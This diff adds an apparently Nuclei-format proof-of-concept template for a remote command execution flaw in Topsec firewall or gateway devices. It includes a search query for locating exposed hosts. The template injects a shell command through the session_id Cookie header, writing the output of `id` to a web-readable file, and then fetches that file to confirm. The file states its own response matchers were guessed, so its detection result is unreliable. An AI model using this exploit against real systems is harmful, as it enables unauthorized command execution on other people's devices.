@@ -1,0 +1,38 @@
+id: poc-c2708c229dfcc97d7ccd
+info:
+  name: 天融信TOPSECCookie远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/c2708c229dfcc97d7ccd1a4d02d1a1cc
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: c2708c229dfcc97d7ccd1a4d02d1a1cc
+    fofa: + hunter`web.body="/cgi/maincgi.cgi?Url=VerifyCode"`
+http:
+- raw:
+  - 'GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: session_id_443=1|echo `id`  > /www/htdocs/site/image/tt.txt;
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /site/image/tt.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
